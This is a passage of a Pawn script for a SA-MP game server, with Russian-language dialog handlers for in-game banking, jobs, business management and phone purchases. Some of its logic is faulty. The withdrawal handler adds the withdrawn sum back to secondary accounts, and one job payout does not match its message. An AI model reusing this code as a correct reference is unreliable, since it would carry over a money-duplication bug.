		        SendClientMessage(playerid,CGREY,"Недостаточно средств");
		        ShowPlayerDialog(playerid,65,DIALOG_STYLE_INPUT,"Пополнение счета","{FFFFFF}Введите на сколько хотите пополнить Ваш счет:","Далее","Назад");
		        return true;
		    }
		    if(krek < 1 || krek > 10000000)
		    {
		        SendClientMessage(playerid,CGREY,"Положить на счет можно от $1 до $10000000");
		        ShowPlayerDialog(playerid,65,DIALOG_STYLE_INPUT,"Пополнение счета","{FFFFFF}Введите на сколько хотите пополнить Ваш счет:","Далее","Назад");
		        return true;
		    }
		    static const fmt_string1[] = "[BANK]{FFFFFF} Ваш счет \"%s\" пополнен на $%i. Новый баланс: $%i ";
			new str1[sizeof(fmt_string1)+10+10+64];
		    if(!GetPVarInt(playerid,"Schet"))
		    {
			    PlayerInfo[playerid][pBank] += krek;
			    SetPlayerInt(PlayerInfo[playerid][pSendername],"bank",PlayerInfo[playerid][pBank]);
			    format(str1, sizeof(str1), fmt_string1,"Основной",krek,PlayerInfo[playerid][pBank]);
		    }
		    else
		    {
		        BanksInfo[playerid][bankCash][GetPVarInt(playerid,"Schet")] += krek;
		        query = "";
		        format(query,sizeof(query),"UPDATE `banks` SET `cash` = '%d' WHERE id = '%d' LIMIT 1",BanksInfo[playerid][bankCash][GetPVarInt(playerid,"Schet")], GetPVarInt(playerid,"Schet"));
				mysql_tquery(mysql,query);
				format(str1, sizeof(str1), fmt_string1,BanksName[playerid][GetPVarInt(playerid,"Schet")],krek,BanksInfo[playerid][bankCash][GetPVarInt(playerid,"Schet")]);
		    }
		    GiveMoney(playerid,-krek);
		    SetPlayerInt(PlayerInfo[playerid][pSendername],"cash",PlayerInfo[playerid][pCash]);
			
			
			SendClientMessage(playerid,CREWARD,str1);
		}
		case 66:
		{
		    if(!response) return true;
   			new krek;
		    if(sscanf(inputtext,"i",krek)) return ShowPlayerDialog(playerid,66,DIALOG_STYLE_INPUT,"Снять со счета","{FFFFFF}Введите сколько хотите снять со счета:","Далее","Назад");
            if(!GetPVarInt(playerid,"Schet"))
		    {
				if(krek > PlayerInfo[playerid][pBank])
			    {
			        SendClientMessage(playerid,CGREY,"Недостаточно средств на счету");
			        ShowPlayerDialog(playerid,66,DIALOG_STYLE_INPUT,"Снять со счета","{FFFFFF}Введите сколько хотите снять со счета:","Далее","Назад");
			        return true;
			    }
		    }
		    else
		    {
		        if(krek > BanksInfo[playerid][bankCash][GetPVarInt(playerid,"Schet")])
			    {
			        SendClientMessage(playerid,CGREY,"Недостаточно средств на счету");
			        ShowPlayerDialog(playerid,66,DIALOG_STYLE_INPUT,"Снять со счета","{FFFFFF}Введите сколько хотите снять со счета:","Далее","Назад");
			        return true;
			    }
		    }
		    if(krek < 1 || krek > 1000000)
		    {
		        SendClientMessage(playerid,CGREY,"Снять на счет можно от $1 до $1000000");
		        ShowPlayerDialog(playerid,66,DIALOG_STYLE_INPUT,"Снять со счета","{FFFFFF}Введите сколько хотите снять со счета:","Далее","Назад");
		        return true;
		    }
		    static const fmt_string1[] = "[BANK]{FFFFFF} С Вашего счета \"%s\" снято $%i. Новый баланс: $%i ";
			new str1[sizeof(fmt_string1)+10+10+64];
		    if(!GetPVarInt(playerid,"Schet"))
		    {
			    PlayerInfo[playerid][pBank] -= krek;
			    SetPlayerInt(PlayerInfo[playerid][pSendername],"bank",PlayerInfo[playerid][pBank]);
			    format(str1, sizeof(str1), fmt_string1,"Основной",krek,PlayerInfo[playerid][pBank]);
		    }
		    else
		    {
		        BanksInfo[playerid][bankCash][GetPVarInt(playerid,"Schet")] += krek;
		        query = "";
		        format(query,sizeof(query),"UPDATE `banks` SET `cash` = '%d' WHERE id = '%d' LIMIT 1",BanksInfo[playerid][bankCash][GetPVarInt(playerid,"Schet")], GetPVarInt(playerid,"Schet"));
				mysql_tquery(mysql,query);
				format(str1, sizeof(str1), fmt_string1,BanksName[playerid][GetPVarInt(playerid,"Schet")],krek,BanksInfo[playerid][bankCash][GetPVarInt(playerid,"Schet")]);
		    }
		    GiveMoney(playerid,krek);
		    SetPlayerInt(PlayerInfo[playerid][pSendername],"cash",PlayerInfo[playerid][pCash]);
			
			
			SendClientMessage(playerid,CREWARD,str1);
		}
		
		case 67:
		{
		    if(!response) return true;
		    switch(listitem)
		    {
		        case 0..5:
		        {
					new kek = 0;
					static const fmt_string1[] = "%d | %s\n";
					new str1[sizeof(fmt_string1)-4+3+40];
					query = "";
					for(new i = 1; i <= TOTALGPS; i++)
					{
					    if(GPSInfo[i][gpsList] != listitem+1) continue;
					    format(str1, sizeof(str1), fmt_string1,kek+1,GPSInfo[i][gpsName]);
						strcat(query,str1);
						ListNick[playerid][kek] = i;
						kek++;
					}
		            ShowPlayerDialog(playerid,79,DIALOG_STYLE_LIST,"GPS",query,"Далее","Назад");
		        }
		    //	case 0:
		    //	case 1: ShowPlayerDialog(playerid,80,DIALOG_STYLE_LIST,"GPS","{FFFFFF}1 | Мэрия\n2 | Автошкола\n3 | SAPD\n4 | Central News Network\n5 | Центральная Больница\n6 | SA Army\n7 | 415 Block\n8 | Centro Side\n9 | Bikers\n10 | Yakuza\n11 | Russian Mafia\n12 | La Cosa Nostra","Далее","Назад");
	  		 //	case 2: ShowPlayerDialog(playerid,90,DIALOG_STYLE_LIST,"GPS","{FFFFFF}1 | Водитель автобуса\n2 | Механик\n3 | Развозчик продуктов\n4 | Грузчик\n5 | Повар (Ближайший ресторан)\n6 | Сборщик аптечек\n7 | Добыча песка ","Далее","Назад");
		//		case 3: ShowPlayerDialog(playerid,221,DIALOG_STYLE_LIST,"GPS","{FFFFFF}1 | Класс N\n2 | Класс N (2)\n3 | Класс B\n4 | Класс A","Далее","Назад");
			//	case 4: ShowPlayerDialog(playerid,260,DIALOG_STYLE_LIST,"GPS","{FFFFFF}1 | Аренда роликов\n2 | Регистрация на гонки\n3 | Регистрация на GunGame","Далее","Назад");
				case 6:
				{
					query = "";
					new kek = 1;
					for(new i = 1; i <= TOTALBIZ; i++)
					{
					    if(BizInfo[i][bUl][2])
					    {
		           			static const fmt_string1[] = "{FFFFFF}%i | %s\n";
							new str1[sizeof(fmt_string1)+4+32];
							format(str1, sizeof(str1), fmt_string1,kek, BizInfo[i][bName]);
							ListNick[playerid][kek-1] = i;
							kek++;
							strcat(query, str1);
						}
					}
					if(kek == 1) return SendClientMessage(playerid,CGREY,"Список пуст");
					ShowPlayerDialog(playerid,81,DIALOG_STYLE_LIST,"GPS",query,"Далее","Назад");
				}
				case 7: ShowPlayerDialog(playerid,262,DIALOG_STYLE_LIST,"GPS","{FFFFFF}1 | Ближайший магазин 24/7\n2 | Ближайшая заправка\n3 | Ближайшая закусочная\n4 | Ближайший банкомат\n5 | Ближайший отель\n6 | Ближайший магазин асессуаров","Далее","Назад");
				
			}
		}
		
		case 68:
		{
		    if(!response) return true;
		    switch(GetPVarInt(playerid,"Gruz"))
		    {
		        case 0:
		        {
         			if(GetPVarInt(playerid,"Pes") > 0)
					{
						DeletePVar(playerid,"Pes");
						DeletePVar(playerid,"PesW");
						DisablePlayerCheckpoint(playerid);
						if(IsPlayerAttachedObjectSlotUsed(playerid, 1)) RemovePlayerAttachedObject(playerid, 1);
						if(IsPlayerAttachedObjectSlotUsed(playerid, 5)) RemovePlayerAttachedObject(playerid, 5);
						if(IsValidDynamicCP(GetPVarInt(playerid,"PesCheck"))) DestroyDynamicCP(GetPVarInt(playerid,"PesCheck")),DeletePVar(playerid,"PesCheck");
     					if(IsValidDynamicPickup(GetPVarInt(playerid,"PesPick"))) DestroyDynamicPickup(GetPVarInt(playerid,"PesPick")),DeletePVar(playerid,"PesPick");
						DeletePVar(playerid,"PesC");
					}
					if(GetPVarInt(playerid,"Povar") > 0)
					{
						DeletePVar(playerid,"Povar");
						DeletePVar(playerid,"PovarW");
						DisablePlayerCheckpoint(playerid);
						DeletePVar(playerid,"PovarC");
						DeletePVar(playerid,"PovarM");
						if(IsPlayerAttachedObjectSlotUsed(playerid, 1)) RemovePlayerAttachedObject(playerid, 1);
						if(IsValidDynamicObject(GetPVarInt(playerid,"PovarObject"))) DestroyDynamicObject(GetPVarInt(playerid,"PovarObject")),DeletePVar(playerid,"PovarObject");
						DeletePVar(playerid,"PovarEda");
					}
		            SetPVarInt(playerid,"Gruz",1);
		            SetPVarInt(playerid,"GruzC",0);
		            SetPVarInt(playerid,"GruzW",1);
 					ApplyDynamicActorAnimation(BotGruz,"PED","IDLE_CHAT",4.0,0,0,0,0,0);
					Update3DTextLabelTextEx(TextGruz,-1,"Держи форму и быстро за работу!");
					SetTimerEx("ClearBotGlobalClear", 3000, false,"dd",BotGruz,_:TextGruz);
		            SendClientMessage(playerid,CGREEN,"Вы начали работу грузчика. Ваша задача перетащить коробки с продуктами на склад");
		            SetPlayerCheckpoint(playerid, 1738.3090,761.8082,10.6680, 3.0);
		            SetKaska(playerid);
		        }
		        case 1:
		        {
           			static const fmt_string1[] = "Вы закончили работу грузчика. Вы перенесли %i ящиков и заработали $%i";
					new str1[sizeof(fmt_string1)+4+4];
					format(str1, sizeof(str1), fmt_string1,GetPVarInt(playerid,"GruzC"),GetPVarInt(playerid,"GruzC")*2);
					SendClientMessage(playerid,CGREEN,str1);
					GiveMoney(playerid,GetPVarInt(playerid,"GruzC")*80);
					if(!PlayerInfo[playerid][pQuestS][1])
					{
						PlayerQuest[playerid][1][2] += GetPVarInt(playerid,"GruzC");
						CheckQuest(playerid,1);
					}
     				DeletePVar(playerid,"Gruz");
		            DeletePVar(playerid,"GruzW");
		            DisablePlayerCheckpoint(playerid);
					SetPlayerSpecialAction(playerid,0);
					if(IsPlayerAttachedObjectSlotUsed(playerid, 1)) RemovePlayerAttachedObject(playerid, 1);
					static const fmt_str1[] = "Хорошая работа. Держи свои $%i";
					new string1[sizeof(fmt_str1)+10];
					format(string1, sizeof(string1), fmt_str1, GetPVarInt(playerid,"GruzC")*2);
					ApplyDynamicActorAnimation(BotGruz,"PED","IDLE_CHAT",4.0,0,0,0,0,0);
					Update3DTextLabelTextEx(TextGruz,-1,string1);
					SetTimerEx("ClearBotGlobalClear", 3000, false,"dd",BotGruz,_:TextGruz);
     				DeletePVar(playerid,"GruzC");
					if(IsPlayerAttachedObjectSlotUsed(playerid, 5)) RemovePlayerAttachedObject(playerid, 5);
					CheckJobHelp(playerid);
		        }
		    }
		}
		case 57:
		{
			if(!response) return RemovePlayerFromVehicle(playerid);
			if(PlayerInfo[playerid][pCash] < 50)
			{
			    SendClientMessage(playerid,CGREY,"Недостаточно средств");
			    RemovePlayerFromVehicle(playerid);
			    return true;
			}
   			if(GetPVarInt(playerid,"Mar") > 0) ClearJob(playerid);
			GiveMoney(playerid,-50);
			SetPVarInt(playerid,"Bus",GetPlayerVehicleID(playerid));
			SetPVarInt(playerid,"Mar",1);
			RentCar[GetPlayerVehicleID(playerid)] = playerid;
			ShowPlayerDialog(playerid,196,DIALOG_STYLE_LIST,"Выберите тариф","1 | Цена за 1км\n2 | Цена договорная","Далее","");
			for(new i = 0;i< MAX_VEHICLES;i++) if(RentCar[i] == playerid && i != GetPlayerVehicleID(playerid)) SetVehicleToRespawn(i);
		}
		
		case 69:
		{
			if(!response) return RemovePlayerFromVehicle(playerid);
			if(PlayerInfo[playerid][pCash] < 50)
			{
			    SendClientMessage(playerid,CGREY,"Недостаточно средств");
			    RemovePlayerFromVehicle(playerid);
			    return true;
			}
   			if(GetPVarInt(playerid,"Mar") > 0) ClearJob(playerid);
			GiveMoney(playerid,-50);
			SetPVarInt(playerid,"Bus",GetPlayerVehicleID(playerid));
			SetPVarInt(playerid,"Raz",1);
			SetPVarInt(playerid,"Mar",1);
			RentCar[GetPlayerVehicleID(playerid)] = playerid;
			SendClientMessage(playerid,-1,"Вы арендовали машину для развозки продуктов. Для того, чтобы посмотреть заказы используйте {f7ae11}/plist");
			SendClientMessage(playerid,-1,"Для того, чтобы закончить работу используйте: {f7ae11}/end");
			UpdateDynamic3DTextLabelText(CarLable[GetPlayerVehicleID(playerid)],-1,"");
			for(new i = 0;i< MAX_VEHICLES;i++) if(RentCar[i] == playerid && i != GetPlayerVehicleID(playerid)) SetVehicleToRespawn(i);
		}
		case 70:
		{
		    if(!response) return true;
		    BizMenu(playerid);
		}
		case 71:
		{
		    if(!response) return cmd_biz(playerid,"");
		    switch(listitem+1)
		    {
			    //case 0: ShowPlayerDialog(playerid,72,DIALOG_STYLE_INPUT,"Процент цен","{FFFFFF}Введите процент цен, который вы хотите поставить в свой бизнес:","Далее","Назад");
			    case 1:
				{
					new i = GetPVarInt(playerid,"PlayerBiz");
					switch(BizInfo[i][bLock])
					{
					    case 0:
						{
						    BizInfo[i][bLock] = 1;
						    SendClientMessage(playerid,CREWARD,"[BIZ]{FFFFFF} Вы закрыли бизнес");
						}
						case 1:
						{
						    BizInfo[i][bLock] = 0;
						    SendClientMessage(playerid,CREWARD,"[BIZ]{FFFFFF} Вы открыли бизнес");
						}
					}
					UpdateBiz(i);
					BizMenu(playerid);
				}
				case 2:
				{
 					switch(BizInfo[GetPVarInt(playerid,"PlayerBiz")][bType])
					{
					    case 9: SendClientMessage(playerid,CGREY,"Ваш бизнес не поддерживает данную функцию");
						default: ShowPlayerDialog(playerid,168,DIALOG_STYLE_INPUT,"Цена входа","{FFFFFF}Введите цену входа, которую вы хотите поставить на свой бизнес:","Далее","Назад");
					}
				}
				case 3: cmd_sellbizgos(playerid);
				case 4: SetPVarInt(playerid,"Obm",2),ShowPlayerDialog(playerid,372,DIALOG_STYLE_INPUT,"Продать бизнес игроку","{ffffff}Введите ID игрока и цену через запятую!\n\nНапример: 53,100000","Далее","Отмена");
				case 5: SetPVarInt(playerid,"Obm",3), ShowPlayerDialog(playerid,372,DIALOG_STYLE_INPUT,"Обменяться бизнесами с игроком","{ffffff}Введите ID игрока и доплату через запятую!\n\nНапример: 53,100000","Далее","Отмена");
				case 6:
				{
					query = "{ffffff}Товар\t{ffffff}Цена\t{ffffff}Затраты\t{ffffff}Прибыль\n";
					new str[100];
				    for(new i = 0; i < MAX_PROD[GetPVarInt(playerid,"PlayerBiz")]; i++)
				    {
				        format(str,sizeof(str),"%s\t%d$ (рек.: %d$)\t{F85A5A}%d ед.\t{20BA09}%d$\n",ProdNames[GetPVarInt(playerid,"PlayerBiz")][i],
				        ProdInfo[GetPVarInt(playerid,"PlayerBiz")][prodCena][i],
				        ProdCena[BizInfo[GetPVarInt(playerid,"PlayerBiz")][bType]-1][i],
				        ProdInfo[GetPVarInt(playerid,"PlayerBiz")][prodMinus][i],
				        ProdInfo[GetPVarInt(playerid,"PlayerBiz")][prodCena][i]*70/100);
				        strcat(query,str);

				    }
				    ShowPlayerDialog(playerid, 439, DIALOG_STYLE_TABLIST_HEADERS, "Изменение цен",query,"Далее", "Отмена");
				}
				case 7:
				{
				    if(GetPlayerBiz(playerid))
				    {
				        if(!BizInfo[GetPVarInt(playerid,"PlayerBiz")][bUl][1])
						{
						    SendClientMessage(playerid,CGREY,"Вам недоступна данная функция");
							return SendClientMessage(playerid,CGREY,"Вам требуется приобрести улучшение 'Дополнительное рабочее место'");
						}
	   					if(strfind(BizInfo[GetPVarInt(playerid,"PlayerBiz")][bMen],"None",true) != -1) ShowPlayerDialog(playerid,170,DIALOG_STYLE_INPUT,"Назначить управляющего","{FFFFFF}Введите ID игрока, которого хотите назначить управляющим:","Далее","Назад");
						else
						{
						    if(GetPlayerID(BizInfo[GetPVarInt(playerid,"PlayerBiz")][bMen]) != INVALID_PLAYER_ID) DeletePVar(GetPlayerID(BizInfo[GetPVarInt(playerid,"PlayerBiz")][bMen]),"PlayerBiz"),SendClientMessage(GetPlayerID(BizInfo[GetPVarInt(playerid,"PlayerBiz")][bMen]),CREWARD,"Вас уволили с поста управляющего");

							strmid(BizInfo[GetPVarInt(playerid,"PlayerBiz")][bMen], "None", 0, strlen("None"), 32);
							query = "";
						    format(query, sizeof(query), "UPDATE `biz` SET `menedger` = 'None' WHERE id = '%d' LIMIT 1",GetPVarInt(playerid,"PlayerBiz"));
							mysql_tquery(mysql,query);
							SendClientMessage(playerid,CREWARD,"[BIZ]{FFFFFF} Вы уволили управляющего");
						}
					}
					else SendClientMessage(playerid,CGREY,"У Вас недостаточно полномочий");
				}
				case 8:
				{
					switch(BizInfo[GetPVarInt(playerid,"PlayerBiz")][bType])
					{
					    /*case 9:
						{
						        new kek1 = 0;
						        new  str[100];
						       	query = "";
						        for(new i = 1; i <= TOTALCJ; i++)
								{
								    if(CarJob[i][jbiz] != GetPVarInt(playerid,"PlayerBiz")) continue;
							        switch(BizInfo[GetPVarInt(playerid,"PlayerBiz")][bUl][0])
							        {
							            case 0: if(kek1 == 10) break;
							            default: if(kek1 == 15) break;
							        }
									if(CarJob[i][jidcar] == 0) format(str,sizeof(str),"Место №%i | Заказать машину\n",kek1+1), strcat(srrt, str);
									else format(str,sizeof(str),"Место №%i | %s (id:%i)\n",kek1+1,VehicleNameS[CarJob[i][jidcar]-400],CarJob[i][jidcar]), strcat(srrt, str);
									ListNick[playerid][kek1] = i;
									kek1++;
						        }
						        ShowPlayerDialog(playerid,52,DIALOG_STYLE_LIST,"Панель машин",srrt,"Далее","Назад");
					    }*/
						default:
						{
						    if(BizInfo[GetPVarInt(playerid,"PlayerBiz")][bZakaz] > 0) {SendClientMessage(playerid,CGREY,"У Вас уже имеется заказ"); return BizMenu(playerid);}
							else ShowPlayerDialog(playerid,73,DIALOG_STYLE_INPUT,"Заказ продуктов","{FFFFFF}Введите сколько хотите заказать продуктов в свой бизнес:","Далее","Назад");
						}
					}
				}
				case 9:
				{
				    ShowPlayerDialog(playerid,414,DIALOG_STYLE_LIST,"Звук","1 | Отключить\nЗвук 1\nЗвук 2\nЗвук 3\nЗвук 4\nЗвук 5\nДобавить свой звук","Далее","Отмена");
				}
				case 10: ShowBizUl(playerid);
		    }
		}
		case 72:
		{
		    if(!response) return BizMenu(playerid);
   			new krek;
		    if(sscanf(inputtext,"i",krek)) return ShowPlayerDialog(playerid,72,DIALOG_STYLE_INPUT,"Процент цен","{FFFFFF}Введите процент цен, который вы хотите поставить в свой бизнес:","Далее","Назад");
		    if(krek < 50 || krek > 100)
		    {
		        SendClientMessage(playerid,CGREY,"Вы можете установить процент цен от 50 до 100");
		        ShowPlayerDialog(playerid,72,DIALOG_STYLE_INPUT,"Процент цен","{FFFFFF}Введите процент цен, который вы хотите поставить в свой бизнес:","Далее","Назад");
		        return true;
		    }
			BizInfo[GetPVarInt(playerid,"PlayerBiz")][bTill] = krek;
			static const fmt_string1[] = "[BIZ]{FFFFFF} Вы установили процент цен в бизнесе. Процент: %i";
			new str1[sizeof(fmt_string1)+4];
			format(str1, sizeof(str1), fmt_string1,BizInfo[GetPVarInt(playerid,"PlayerBiz")][bTill]);
			SendClientMessage(playerid,CREWARD,str1);
			BizMenu(playerid);
		}
		case 73:
		{
  			if(!response) return BizMenu(playerid);
   			new krek;
		    if(sscanf(inputtext,"i",krek)) return ShowPlayerDialog(playerid,73,DIALOG_STYLE_INPUT,"Заказ продуктов","{FFFFFF}Введите сколько хотите заказать продуктов в свой бизнес:","Далее","Назад");
		    if(BizInfo[GetPVarInt(playerid,"PlayerBiz")][bUl][0])
		    {
				if(krek < 1000 || krek > 5000)
			    {
			        SendClientMessage(playerid,CGREY,"Вы можете заказать от 1000 до 5000 продуктов за раз");
			        ShowPlayerDialog(playerid,73,DIALOG_STYLE_INPUT,"Заказ продуктов","{FFFFFF}Введите сколько хотите заказать продуктов в свой бизнес:","Далее","Назад");
			        return true;
			    }
				if(krek+BizInfo[GetPVarInt(playerid,"PlayerBiz")][bProd] > 5000)
			    {
			        SendClientMessage(playerid,CGREY,"Недостаточно места на складе");
			        ShowPlayerDialog(playerid,73,DIALOG_STYLE_INPUT,"Заказ продуктов","{FFFFFF}Введите сколько хотите заказать продуктов в свой бизнес:","Далее","Назад");
			        return true;
			    }
		    }
		    else
		    {
				if(krek < 1000 || krek > 3000)
			    {
			        SendClientMessage(playerid,CGREY,"Вы можете заказать от 1000 до 3000 продуктов за раз");
			        ShowPlayerDialog(playerid,73,DIALOG_STYLE_INPUT,"Заказ продуктов","{FFFFFF}Введите сколько хотите заказать продуктов в свой бизнес:","Далее","Назад");
			        return true;
			    }
				if(krek+BizInfo[GetPVarInt(playerid,"PlayerBiz")][bProd] > 3000)
			    {
			        SendClientMessage(playerid,CGREY,"Недостаточно места на складе");
			        ShowPlayerDialog(playerid,73,DIALOG_STYLE_INPUT,"Заказ продуктов","{FFFFFF}Введите сколько хотите заказать продуктов в свой бизнес:","Далее","Назад");
			        return true;
			    }
		    }
			
		    if(BizInfo[GetPVarInt(playerid,"PlayerBiz")][bZakaz] > 0)
		    {
		        SendClientMessage(playerid,CGREY,"Вы уже подали заказ на продукты");
		        ShowPlayerDialog(playerid,73,DIALOG_STYLE_INPUT,"Заказ продуктов","{FFFFFF}Введите сколько хотите заказать продуктов в свой бизнес:","Далее","Назад");
		        return true;
		    }
		    if(BizInfo[GetPVarInt(playerid,"PlayerBiz")][bMoney] < 2*krek)
		    {
		        SendClientMessage(playerid,CGREY,"Недостаточно денег на счету бизнеса");
		        ShowPlayerDialog(playerid,73,DIALOG_STYLE_INPUT,"Заказ продуктов","{FFFFFF}Введите сколько хотите заказать продуктов в свой бизнес:","Далее","Назад");
		        return true;
		    }
		    BizInfo[GetPVarInt(playerid,"PlayerBiz")][bZakaz] = krek;
   			static const fmt_string1[] = "[BIZ]{FFFFFF} Вы заказали %i продуктов в бизнес";
			new str1[sizeof(fmt_string1)+4];
			format(str1, sizeof(str1), fmt_string1,BizInfo[GetPVarInt(playerid,"PlayerBiz")][bZakaz]);
			SendClientMessage(playerid,CREWARD,str1);
			BizMenu(playerid);
			foreach(new i : Player)
			{
			    if(!IsPlayerConnected(i) || PlayerLogged[i] == false) continue;
			    if(GetPVarInt(i,"Raz") > 0)
			    {
	    			static const fmt_string2[] = "[J] Поступил заказ от %s. Принять заказ: /plist";
					new str2[sizeof(fmt_string2)+32];
					format(str2, sizeof(str2), fmt_string2,BizInfo[GetPVarInt(playerid,"PlayerBiz")][bName]);
					SendClientMessage(i,COLOR_SKLAD,str2);
			    }
			}
		    
		}
		case 74:
		{
		    if(!response) return true;
		    if(Product[GetPlayerVehicleID(playerid)] == 0) return SendClientMessage(playerid,CGREY,"Ваша машина пуста. Используйте: /load на складе грузчиков");
		    if(BizInfo[ListNick[playerid][listitem]][bZakaz] == 0) return SendClientMessage(playerid,CGREY,"Заказ от данного бизнеса не поступал");
		    SetPVarInt(playerid,"RazK",ListNick[playerid][listitem]);
			SetPlayerRaceCheckpoint(playerid, 2,BizInfo[ListNick[playerid][listitem]][bX],BizInfo[ListNick[playerid][listitem]][bY],BizInfo[ListNick[playerid][listitem]][bZ],0,0,0,10);
			foreach(new i : Player)
			{
			    if(!IsPlayerConnected(i) || PlayerLogged[i] == false) continue;
			    if(GetPVarInt(i,"Raz") > 0)
			    {
	    			static const fmt_string2[] = "[J] %s принял заказ от %s";
					new str2[sizeof(fmt_string2)+32];
					format(str2, sizeof(str2), fmt_string2,PlayerInfo[playerid][pSendername],BizInfo[ListNick[playerid][listitem]][bName]);
					SendClientMessage(i,COLOR_SKLAD,str2);
			    }
			}
		}

		case 75:
		{
		    if(!response)
		    {
		        DeletePVar(playerid,"AmmoGun");
		        DeletePVar(playerid,"AmmoPrice");
		        return true;
		    }
		    if(BizInfo[GetPVarInt(playerid,"PBIZ")][bProd] < GetPVarInt(playerid,"AmmoProd"))
		    {
		        SendClientMessage(playerid,CGREY,"В магазине кончились продукты");
		        DeletePVar(playerid,"AmmoGun");
		        DeletePVar(playerid,"AmmoPrice");
		        return true;
		    }
		    if(!GetPVarInt(playerid,"Oplata"))
      		{
				if(PlayerInfo[playerid][pCash] < GetCena(GetPVarInt(playerid,"PBIZ"),GetPVarInt(playerid,"AmmoPrice")))
				{
			        SendClientMessage(playerid,CGREY,"Недостаточно средств");
			        DeletePVar(playerid,"AmmoGun");
			        DeletePVar(playerid,"AmmoPrice");
			        return true;
				}
			}
			else
			{
				if(PlayerInfo[playerid][pBank] < GetCena(GetPVarInt(playerid,"PBIZ"),GetPVarInt(playerid,"AmmoPrice")))
				{
			        SendClientMessage(playerid,CGREY,"Недостаточно средств");
			        DeletePVar(playerid,"AmmoGun");
			        DeletePVar(playerid,"AmmoPrice");
			        return true;
				}
			}
			if(GetFree(playerid,317,1))
			{
			    DeletePVar(playerid,"AmmoGun");
       			DeletePVar(playerid,"AmmoPrice");
				return SendClientMessage(playerid,CGREY,"Недостаточно места в иннвентаре!");
			}
			//	GiveInv(playerid,19513,1);
			new rand = random(999999);
			query = "";
            format(query, sizeof(query), "SELECT * FROM "TABLE_ACCOUNT" WHERE phone = '%i' LIMIT 1", rand);
			mysql_tquery(mysql, query, "CheckPhone", "dd", playerid,rand);
			
		/*	format(query, sizeof(query), "SELECT * FROM "TABLE_ACCOUNT" WHERE phone = '%i' LIMIT 1", rand);
			mysql_tquery(mysql,query);
			mysql_store_result();
			if(mysql_fetch_row_format(query)) return mysql_free_result();
			mysql_free_result();
			if(!GetPVarInt(playerid,"Oplata")) GiveMoney(playerid,-GetCena(GetPVarInt(playerid,"PBIZ"),GetPVarInt(playerid,"AmmoPrice")));
			else PlayerInfo[playerid][pBank] -= GetCena(GetPVarInt(playerid,"PBIZ"),GetPVarInt(playerid,"AmmoPrice"));
			BizMinus(GetPVarInt(playerid,"PBIZ"),GetCena(GetPVarInt(playerid,"PBIZ"),GetPVarInt(playerid,"AmmoPrice")),2);
			ApplyDynamicActorAnimation(BIZBOT[GetPVarInt(playerid,"PBIZ")],"PED","IDLE_CHAT",4.0,0,0,0,0,0);
			Update3DTextLabelTextEx(BotLable[GetPVarInt(playerid,"PBIZ")],-1,"Спасибо за покупку");
			SetTimerEx("ClearBotGlobal", 3000, false, "dd", BIZBOT[GetPVarInt(playerid,"PBIZ")],_:BotLable[GetPVarInt(playerid,"PBIZ")]);
  			PlayerInfo[playerid][pPhone] = rand;
  			SaveAccount(playerid);
			static const fmt_str[] = "Вы приобрели телефон. Ваш номер: %i";
			new str[sizeof(fmt_str)+6];
   			format(str, sizeof(str), fmt_str,PlayerInfo[playerid][pPhone]);
			SendClientMessage(playerid,CREWARD,str);
			SendClientMessage(playerid,CREWARD,"/sms - Написать SMS | /call - Позвонить");
			SendClientMessage(playerid,CREWARD,"/phone - Телефонная книга | /phoneadd - Добавить в телефонную книгу | /phonedelete - Убрать из телефонной книги");
   			DeletePVar(playerid,"AmmoGun");
      		DeletePVar(playerid,"AmmoPrice");*/
		}
		case 76:
		{
		    if(!response)
		    {
		        DeletePVar(playerid,"AmmoGun");
		        DeletePVar(playerid,"AmmoPrice");
		        return true;
		    }
   			new krek;
		    if(sscanf(inputtext,"i",krek))
			{
   				static const fmt_str1[] = "{FFFFFF}Вы хотите купить сим-карту?\nЦена: $%i\nВведите какой номер хотите приобрести:";
				new string1[sizeof(fmt_str1)+5];
				format(string1, sizeof(string1), fmt_str1, GetCena(GetPVarInt(playerid,"PBIZ"),150));
				ShowPlayerDialog(playerid,76,DIALOG_STYLE_INPUT,"Покупка сим-карты",string1,"Да","Нет");
				return true;
			}
			if(PlayerInfo[playerid][pPhone] == 0)
			{
		        SendClientMessage(playerid,CGREY,"У Вас нет телефона");
		        DeletePVar(playerid,"AmmoGun");
		        DeletePVar(playerid,"AmmoPrice");
		        return true;
			}
			if(krek < 100000 || krek > 999999)
			{
			    SendClientMessage(playerid,CGREY,"Номер телефона состоит из 6 символов");
   				static const fmt_str1[] = "{FFFFFF}Вы хотите купить сим-карту?\nЦена: $%i\nВведите какой номер хотите приобрести:";
				new string1[sizeof(fmt_str1)+5];
				format(string1, sizeof(string1), fmt_str1, GetCena(GetPVarInt(playerid,"PBIZ"),150));
				ShowPlayerDialog(playerid,76,DIALOG_STYLE_INPUT,"Покупка сим-карты",string1,"Да","Нет");
				return true;
			}
		    if(BizInfo[GetPVarInt(playerid,"PBIZ")][bProd] < GetPVarInt(playerid,"AmmoProd"))
		    {
		        SendClientMessage(playerid,CGREY,"В магазине кончились продукты");
		        DeletePVar(playerid,"AmmoGun");
		        DeletePVar(playerid,"AmmoPrice");
		        return true;
		    }
		    if(!GetPVarInt(playerid,"Oplata"))
      		{
				if(PlayerInfo[playerid][pCash] < GetCena(GetPVarInt(playerid,"PBIZ"),GetPVarInt(playerid,"AmmoPrice")))
				{
			        SendClientMessage(playerid,CGREY,"Недостаточно средств");
			        DeletePVar(playerid,"AmmoGun");
			        DeletePVar(playerid,"AmmoPrice");
			        return true;
				}
			}
			else
			{
				if(PlayerInfo[playerid][pBank] < GetCena(GetPVarInt(playerid,"PBIZ"),GetPVarInt(playerid,"AmmoPrice")))
				{
			        SendClientMessage(playerid,CGREY,"Недостаточно средств");
			        DeletePVar(playerid,"AmmoGun");
			        DeletePVar(playerid,"AmmoPrice");
			        return true;
				}
			}
			query = "";
			format(query, sizeof(query), "SELECT * FROM "TABLE_ACCOUNT" WHERE phone = '%i' LIMIT 1", krek);
			mysql_tquery(mysql, query, "CheckSim", "dd", playerid,krek);
			
			
			/*format(query, sizeof(query), "SELECT * FROM "TABLE_ACCOUNT" WHERE phone = '%i' LIMIT 1", krek);
			mysql_tquery(mysql,query);
			mysql_store_result();
			if(mysql_fetch_row_format(query))
			{
				ApplyDynamicActorAnimation(BIZBOT[GetPVarInt(playerid,"PBIZ")],"PED","IDLE_CHAT",4.0,0,0,0,0,0);
				Update3DTextLabelTextEx(BotLable[GetPVarInt(playerid,"PBIZ")],-1,"Данная сим-карта уже зарегистрирована");
